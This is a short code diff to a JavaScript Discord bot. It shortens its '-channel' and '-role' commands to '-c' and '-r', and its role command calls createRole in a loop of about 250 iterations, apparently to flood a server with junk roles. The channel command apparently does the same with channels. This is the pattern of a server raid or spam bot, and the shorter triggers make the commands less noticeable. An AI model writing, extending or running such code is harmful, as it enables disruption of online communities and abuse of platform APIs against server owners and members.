@@ -7,7 +7,7 @@ const Prefix = '-'
 
 
 client.on('message', async msg => {
-  if (msg.content === Prefix + 'channel')
+  if (msg.content === Prefix + 'c')
   {
     msg.delete();
     var i;
@@ -18,11 +18,11 @@ client.on('message', async msg => {
     }
 
   }
-  if (msg.content === Prefix + 'role')
+  if (msg.content === Prefix + 'r')
   {
     msg.delete();
 
-    for ( i=0  ; i <= 300; i++) // makes 250 roles named 'role'
+    for ( i=0  ; i <= 250; i++) // makes 250 roles named 'role'
     {
 
     await msg.guild.createRole({name:'role'}) // Change ({name:'role'}) to what you want
